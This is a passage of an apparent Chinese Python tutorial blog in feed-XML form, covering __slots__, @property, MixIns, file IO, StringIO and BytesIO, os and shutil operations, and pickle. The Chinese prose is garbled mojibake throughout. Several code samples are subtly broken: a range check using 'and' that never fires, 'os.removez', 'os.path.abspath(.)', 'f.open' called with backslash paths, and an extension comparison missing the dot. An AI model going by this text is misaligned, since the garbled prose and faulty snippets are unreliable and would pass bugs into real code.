<p>Pythonå¯¹äºç±»çš„å±æ€§çš„å¤„ç†æ˜¯éå¸¸çµæ´»çš„ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªclassï¼Œåˆ›å»ºäº†ä¸€ä¸ªclassçš„å®ä¾‹åï¼Œæˆ‘ä»¬å¯ä»¥ç»™è¯¥å®ä¾‹ç»‘å®šä»»ä½•å±æ€§å’Œæ–¹æ³• ã€‚ä»Šå¤©è¿™ä¸€ç¯‡æ–‡ç« å°±å°†ä¸¤ä¸ªå…³äºå¯¹è±¡çš„å±æ€§çš„ç”¨æ³•ï¼š<code>slots</code>å’Œ<code>@property</code>ã€‚</p>
<h2 id="slots-å˜é‡">__slots__å˜é‡</h2>
<p>åœ¨ç±»ä¸­å®šä¹‰<code>__slots__</code>å˜é‡å¯ä»¥é™åˆ¶å®ä¾‹çš„å±æ€§ï¼Œæ¯”å¦‚ï¼Œ åªå…è®¸å¯¹Studentå®ä¾‹æ·»åŠ <code>name</code>å’Œ<code>age</code>å±æ€§ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line">    __slots__ = (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å³ç”¨tupleå®šä¹‰å…è®¸ç»‘å®šçš„å±æ€§åç§°ï¼Œè¯•å›¾åœ¨å®ä¾‹ä¸­ç»‘å®šå…¶ä»–å±æ€§ä¼šå¾—åˆ°<code>AttributeError</code>çš„é”™è¯¯ã€‚</p>
<p>ä½¿ç”¨<code>__slots__</code>è¦æ³¨æ„ï¼Œ<code>__slots__</code>å®šä¹‰çš„å±æ€§ä»…å¯¹å½“å‰ç±»å®ä¾‹èµ·ä½œç”¨ï¼Œ<strong>å¯¹ç»§æ‰¿çš„å­ç±»æ˜¯ä¸èµ·ä½œç”¨çš„</strong>ã€‚</p>
<p>é™¤éåœ¨å­ç±»ä¸­ä¹Ÿå®šä¹‰<code>__slots__</code>ï¼Œè¿™æ ·ï¼Œå­ç±»å®ä¾‹å…è®¸å®šä¹‰çš„å±æ€§å°±æ˜¯è‡ªèº«çš„<code>__slots__</code>åŠ ä¸Šçˆ¶ç±»çš„<code>__slots__</code>ã€‚</p>
<h2 id="property">@property</h2>
<p>åœ¨ç»‘å®šå±æ€§æ—¶ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥æŠŠå±æ€§æš´éœ²å‡ºå»ï¼Œè™½ç„¶å†™èµ·æ¥å¾ˆç®€å•ï¼Œä½†æ˜¯ï¼Œæ²¡åŠæ³•æ£€æŸ¥å‚æ•°ï¼Œå¯¼è‡´å¯ä»¥æŠŠæˆç»©éšä¾¿æ”¹ï¼Œä¸ºäº†é™åˆ¶scoreçš„èŒƒå›´ï¼Œé€šå¸¸çš„åšæ³•å°±æ˜¯è®¾ç½®<code>set</code>å’Œ<code>get</code>æ–¹æ³•ã€‚å…·ä½“æ¥è¯´ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ª<code>set_score()</code>æ–¹æ³•æ¥è®¾ç½®æˆç»©ï¼Œå†é€šè¿‡ä¸€ä¸ª<code>get_score()</code>æ¥è·å–æˆç»©ï¼Œè¿™æ ·ï¼Œåœ¨<code>set_score()</code>æ–¹æ³•é‡Œï¼Œå°±å¯ä»¥æ£€æŸ¥å‚æ•°ã€‚</p>
<p>ä½†æ˜¯é€šè¿‡Pythonå†…ç½®çš„<code>@property</code>å°±å¯ä»¥æŠŠä¸€ä¸ªæ–¹æ³•å˜æˆå±æ€§è°ƒç”¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>():</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._score;</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;score must be an integer&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">and</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must between 0 ~ 100!&#x27;</span>)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure>
<p>æŠŠä¸€ä¸ªgetteræ–¹æ³•å˜æˆå±æ€§ï¼Œåªéœ€è¦åŠ ä¸Š<code>@property</code>å°±å¯ä»¥äº†ï¼Œæ­¤æ—¶ï¼Œ<code>@property</code>æœ¬èº«åˆåˆ›å»ºäº†å¦ä¸€ä¸ªè£…é¥°å™¨<code>@score.setter</code>ï¼Œè´Ÿè´£æŠŠä¸€ä¸ªsetteræ–¹æ³•å˜æˆå±æ€§èµ‹å€¼ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬å°±æ‹¥æœ‰ä¸€ä¸ªå¯æ§çš„å±æ€§æ“ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score = <span class="number">60</span> <span class="comment"># OKï¼Œå®é™…è½¬åŒ–ä¸ºs.set_score(60)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score <span class="comment"># OKï¼Œå®é™…è½¬åŒ–ä¸ºs.get_score()</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.score = <span class="number">9999</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span>!</span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥å®šä¹‰åªè¯»å±æ€§ï¼Œåªå®šä¹‰getteræ–¹æ³•ï¼Œä¸å®šä¹‰setteræ–¹æ³•å°±æ˜¯ä¸€ä¸ªåªè¯»å±æ€§ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="params">object</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._birth</span><br><span class="line"></span><br><span class="line"><span class="meta">    @birth.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2015</span> - self._birth</span><br></pre></td></tr></table></figure>
<h2 id="å¤šé‡ç»§æ‰¿">å¤šé‡ç»§æ‰¿</h2>
<p>åœ¨è°ˆåˆ°Pythonçš„å¤šé‡ç»§æ‰¿çš„æ—¶å€™ï¼Œç»•ä¸å¼€çš„ä¸€ä¸ªåè¯å°±æ˜¯<code>MixIn</code>ï¼Œå¦‚æœä¹‹å‰å†™è¿‡<code>Django Restful Framework</code>æ¡†æ¶ï¼Œä»å¾ˆå¤šå‡½æ•°åä¸­å°±å¯ä»¥çœ‹å‡ºé‡Œé¢ç”¨åˆ°äº†å¾ˆå¤š<code>MixIn</code>ã€‚</p>
<p>åœ¨è®¾è®¡ç±»çš„ç»§æ‰¿å…³ç³»æ—¶ï¼Œé€šå¸¸ï¼Œä¸»çº¿éƒ½æ˜¯å•ä¸€ç»§æ‰¿ä¸‹æ¥çš„ï¼Œä¾‹å¦‚ï¼Œ<code>Ostrich</code>ç»§æ‰¿è‡ª<code>Bird</code>ã€‚ä½†æ˜¯ï¼Œå¦‚æœéœ€è¦â€œæ··å…¥â€é¢å¤–çš„åŠŸèƒ½ï¼Œé€šè¿‡å¤šé‡ç»§æ‰¿å°±å¯ä»¥å®ç°ï¼Œæ¯”å¦‚ï¼Œè®©<code>Ostrich</code>é™¤äº†ç»§æ‰¿è‡ª<code>Bird</code>å¤–ï¼Œå†åŒæ—¶ç»§æ‰¿<code>Runnable</code>ã€‚è¿™ç§è®¾è®¡é€šå¸¸ç§°ä¹‹ä¸º<code>MixIn</code>ã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span>(<span class="params">Animal, RunnableMixIn, CarnivorousMixIn</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><code>MixIn</code>çš„ç›®çš„å°±æ˜¯ç»™ä¸€ä¸ªç±»å¢åŠ å¤šä¸ªåŠŸèƒ½ï¼Œè¿™æ ·ï¼Œåœ¨è®¾è®¡ç±»çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘é€šè¿‡å¤šé‡ç»§æ‰¿æ¥ç»„åˆå¤šä¸ª<code>MixIn</code>çš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯è®¾è®¡å¤šå±‚æ¬¡çš„å¤æ‚çš„ç»§æ‰¿å…³ç³»ã€‚</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>PythonIOç¼–ç¨‹</title>
    <url>/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="PythonIOç¼–ç¨‹">PythonIOç¼–ç¨‹</h1>
<p>ä¸»è¦è®°å½•Pythonçš„<strong>æ–‡ä»¶è¯»å†™</strong>ã€<strong>æ–‡ä»¶å’Œç›®å½•æ“ä½œ</strong>ä»¥åŠ<strong>JSONåºåˆ—åŒ–</strong>ã€‚</p>
<h2 id="æ–‡ä»¶è¯»å†™">æ–‡ä»¶è¯»å†™</h2>
<p>æ‰€æœ‰æ¨¡å¼çš„å®šä¹‰åŠå«ä¹‰å¯ä»¥å‚è€ƒPythonçš„<a href="https://docs.python.org/3/library/functions.html#open">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h3 id="è¯»æ–‡ä»¶">è¯»æ–‡ä»¶</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = open(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    print(f.read())</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>
<p>æ¯æ¬¡è¿™æ ·è¿‡äºç¹çï¼ŒPythonå¼•å…¥äº†<code>with</code>è¯­å¥è‡ªåŠ¨å¸®æˆ‘ä»¬è°ƒç”¨<code>close()</code>æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure>
<p><code>read()</code>å‡½æ•°ä¼šä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶å¤ªå¤§ï¼ŒPythonç¨‹åºå°±ç›´æ¥æŒ‚æ‰äº†ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>read(size)</code>æ¥æŒ‡å®šæ¯æ¬¡æœ€å¤šè¯»å–sizeå­—èŠ‚çš„å†…å®¹ï¼Œæˆ–è€…ä½¿ç”¨<code>readline()</code>å’Œ<code>readlines()</code>ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæ–‡ä»¶è¾ƒå°ï¼Œç›´æ¥ä½¿ç”¨<code>read()</code>æ–¹æ³•ï¼›å¦‚æœä¸èƒ½ç¡®å®šæ–‡ä»¶å¤§å°ï¼Œå°±åå¤è°ƒç”¨<code>read(size)</code>æ–¹æ³•ï¼›å¦‚æœæ˜¯é…ç½®æ–‡ä»¶ï¼Œè°ƒç”¨<code>readlines()</code>æœ€æ–¹ä¾¿ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    print(line.strip()) <span class="comment"># å»æ‰&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>åƒ<code>open()</code>å‡½æ•°è¿”å›çš„è¿™ç§æœ‰ä¸ª<code>read()</code>æ–¹æ³•çš„å¯¹è±¡ï¼Œåœ¨Pythonä¸­ç§°ä¸ºfile-like-objectã€‚é™¤äº†fileå¤–ï¼Œè¿˜å¯ä»¥æ˜¯å†…å­˜çš„å­—èŠ‚æµï¼Œç½‘ç»œæµï¼Œè‡ªå®šä¹‰æµã€‚</p>
</blockquote>
<h4 id="äºŒè¿›åˆ¶æ–‡ä»¶">äºŒè¿›åˆ¶æ–‡ä»¶</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/test.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">b&#x27;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&#x27;</span> <span class="comment"># åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—èŠ‚</span></span><br></pre></td></tr></table></figure>
<h4 id="å­—ç¬¦ç¼–ç ">å­—ç¬¦ç¼–ç </h4>
<p>è¯»å–éUnicodeç¼–ç çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœé‡åˆ°ä¸€äº›ç¼–ç ä¸è§„èŒƒçš„æ–‡ä»¶ï¼Œ<code>open()</code>å‡½æ•°è¿˜æ¥æ”¶ä¸€ä¸ª<code>error</code>å‚æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.open(<span class="string">&#x27;\User\xxx\gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="å†™æ–‡ä»¶">å†™æ–‡ä»¶</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">&#x27;/User/xxx/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure>
<p>åªæœ‰è°ƒç”¨<code>close()</code>æ–¹æ³•æ—¶ï¼Œæ“ä½œç³»ç»Ÿæ‰ä¿è¯æŠŠæ²¡æœ‰å†™å…¥çš„æ•°æ®å…¨éƒ¨å†™å…¥ç£ç›˜ã€‚å¿˜è®°è°ƒç”¨<code>close()</code>çš„åæœæ˜¯æ•°æ®å¯èƒ½åªå†™äº†ä¸€éƒ¨åˆ†åˆ°ç£ç›˜ï¼Œå‰©ä¸‹çš„ä¸¢å¤±äº†ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯ç”¨<code>with</code>è¯­å¥æ¥å¾—ä¿é™©ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/User/xxx/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;Hello, world&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬å¸Œæœ›è¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾æ€ä¹ˆåŠï¼Ÿå¯ä»¥ä¼ å…¥<code>'a'</code>ä»¥è¿½åŠ ï¼ˆappendï¼‰æ¨¡å¼å†™å…¥ã€‚</p>
<h2 id="StringIOå’ŒBytesIO">StringIOå’ŒBytesIO</h2>
<h3 id="StringIO">StringIO</h3>
<h4 id="å†™å…¥">å†™å…¥</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = StringIO()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f. write(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;world!&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(f.getvalue())</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure>
<p><code>getvalue()</code>æ–¹æ³•ç”¨äºè·å¾—å†™å…¥åçš„strã€‚</p>
<h4 id="è¯»å–">è¯»å–</h4>
<p>è¦è¯»å–StringIOï¼Œå¯ä»¥ç”¨ä¸€ä¸ªstråˆå§‹åŒ–StringIOï¼Œç„¶ååƒè¯»å–æ–‡ä»¶ä¸€æ ·è¯»å–ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = StringIO(<span class="string">&#x27;Hello!\nHi!\nGoogbye!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="meta">... </span>	s = f.readline()</span><br><span class="line"><span class="meta">... </span>	<span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>		<span class="keyword">break</span></span><br><span class="line"><span class="meta">... </span>	print(s.strip())</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Hello!</span><br><span class="line">Hi!</span><br><span class="line">Googbye!</span><br></pre></td></tr></table></figure>
<h3 id="BytesIO">BytesIO</h3>
<h4 id="å†™å…¥-v2">å†™å…¥</h4>
<p>BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytesï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªBytesIOï¼Œç„¶åå†™å…¥ä¸€äº›bytesï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = BytesIO()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;ä¸­æ–‡&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(f.getvalue())</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è¯·æ³¨æ„ï¼Œå†™å…¥çš„ä¸æ˜¯strï¼Œè€Œæ˜¯ç»è¿‡UTF-8ç¼–ç çš„bytesã€‚</p>
<h4 id="è¯»å–-v2">è¯»å–</h4>
<p>å’ŒStringIOç±»ä¼¼ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªbytesåˆå§‹åŒ–BytesIOï¼Œç„¶åï¼Œåƒè¯»æ–‡ä»¶ä¸€æ ·è¯»å–ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = BytesIO(<span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="æ“ä½œæ–‡ä»¶å’Œç›®å½•">æ“ä½œæ–‡ä»¶å’Œç›®å½•</h2>
<h3 id="æ“ä½œç›®å½•">æ“ä½œç›®å½•</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.abspath(.)</span><br><span class="line"><span class="comment"># åœ¨æŸä¸ªç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ï¼Œé¦–å…ˆæŠŠæ–°ç›®å½•çš„å®Œæ•´è·¯å¾„è¡¨ç¤ºå‡ºæ¥</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/Users/xxx&#x27;</span>, <span class="string">&#x27;testdir&#x27;</span>)</span><br><span class="line"><span class="comment"># ç„¶ååˆ›å»ºä¸€ä¸ªç›®å½•</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.mkdir(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>)</span><br><span class="line"><span class="comment"># åˆ æ‰ä¸€ä¸ªç›®å½•</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rmdir(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>æŠŠä¸¤ä¸ªè·¯å¾„åˆæˆä¸€ä¸ªæ—¶ï¼Œä¸è¦ç›´æ¥æ‹¼å­—ç¬¦ä¸²ï¼Œè€Œè¦é€šè¿‡<code>os.path.join()</code>å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æ­£ç¡®å¤„ç†ä¸åŒæ“ä½œç³»ç»Ÿçš„è·¯å¾„åˆ†éš”ç¬¦ã€‚</p>
<p>åŒæ ·çš„é“ç†ï¼Œè¦æ‹†åˆ†è·¯å¾„æ—¶ï¼Œä¹Ÿä¸è¦ç›´æ¥å»æ‹†å­—ç¬¦ä¸²ï¼Œè€Œè¦é€šè¿‡<code>os.path.split()</code>å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥æŠŠä¸€ä¸ªè·¯å¾„æ‹†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåä¸€éƒ¨åˆ†æ€»æ˜¯æœ€åçº§åˆ«çš„ç›®å½•æˆ–æ–‡ä»¶åï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/xxx/testdir/test.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/xxx/testdir&#x27;</span>, <span class="string">&#x27;test.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>os.path.splitext()</code>å¯ä»¥ç›´æ¥å¾—åˆ°æ–‡ä»¶æ‰©å±•åï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;os.path.splitext(<span class="string">&#x27;/Users/xxx/testdir/test.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/xxx/testdir/test&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="æ“ä½œæ–‡ä»¶">æ“ä½œæ–‡ä»¶</h3>
<p>å‡å®šå½“å‰ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>test.txt</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯¹æ–‡ä»¶é‡å‘½å</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rename(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤æ–‡ä»¶</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.removez(<span class="string">&#x27;test.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>Pythonçš„osæ¨¡å—æ²¡æœ‰æä¾›æ–‡ä»¶çš„å¤åˆ¶æ“ä½œï¼Œä½†æ˜¯åœ¨shutilæ¨¡å—æä¾›äº†å¾ˆå¤šä¸­ä¸åŒéœ€æ±‚çš„æ–‡ä»¶å¤åˆ¶æ“ä½œã€‚</p>
<ol>
<li>
<p>shutil.copyfileobj(æ–‡ä»¶1ï¼Œæ–‡ä»¶2)ï¼šå°†æ–‡ä»¶1çš„æ•°æ®è¦†ç›–copyç»™æ–‡ä»¶2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">&quot;1.txt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">shutil.copyfileobj(f1,f2)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>shutil.copy(æ–‡ä»¶1ï¼Œæ–‡ä»¶2)ï¼šæ‹·è´æ–‡ä»¶å’Œæƒé™éƒ½è¿›è¡Œcopyã€‚</p>
</li>
<li>
<p>shutil.move(æºæ–‡ä»¶ï¼ŒæŒ‡å®šè·¯å¾„)ï¼šé€’å½’ç§»åŠ¨ä¸€ä¸ªæ–‡ä»¶ã€‚</p>
</li>
<li>
<p>shutil.copytree(æºç›®å½•ï¼Œç›®æ ‡ç›®å½•)ï¼šå¯ä»¥é€’å½’copyå¤šä¸ªç›®å½•åˆ°æŒ‡å®šç›®å½•ã€‚</p>
</li>
</ol>
<h3 id="è¿‡æ»¤æ–‡ä»¶">è¿‡æ»¤æ–‡ä»¶</h3>
<p>åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isdir(x)]</span><br></pre></td></tr></table></figure>
<p>åˆ—å‡ºæŒ‡å®šåç¼€åçš„æ–‡ä»¶ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;x&#x27;</span>) <span class="keyword">if</span> os.path.isfile(x) <span class="keyword">and</span> os.path.splitext(x)[<span class="number">1</span>] == <span class="string">&#x27;py&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h2 id="åºåˆ—åŒ–">åºåˆ—åŒ–</h2>
<p>Pythonæä¾›äº†<code>pickle</code>æ¨¡å—æ¥å®ç°åºåˆ—åŒ–ã€‚</p>
<p>é¦–å…ˆï¼ŒæŠŠä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = dict(name=<span class="string">&#x27;Bob&#x27;</span>, age=<span class="number">20</span>, score=<span class="number">88</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dumps(d)</span><br><span class="line"><span class="string">b&#x27;\x80\x03&#125;q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>pickle.dumps()</code>æ–¹æ³•æŠŠä»»æ„å¯¹è±¡åºåˆ—åŒ–æˆä¸€ä¸ªbytesï¼Œç„¶åï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ª<code>bytes</code>å†™å…¥æ–‡ä»¶ã€‚è¿˜æœ‰ä¸€ä¸ª<code>pickle.dump()</code>æ–¹æ³•ï¼Œå®ƒç›´æ¥æŠŠå¯¹è±¡åºåˆ—åŒ–åå†™å…¥ä¸€ä¸ªfile-like Objectï¼š</p>
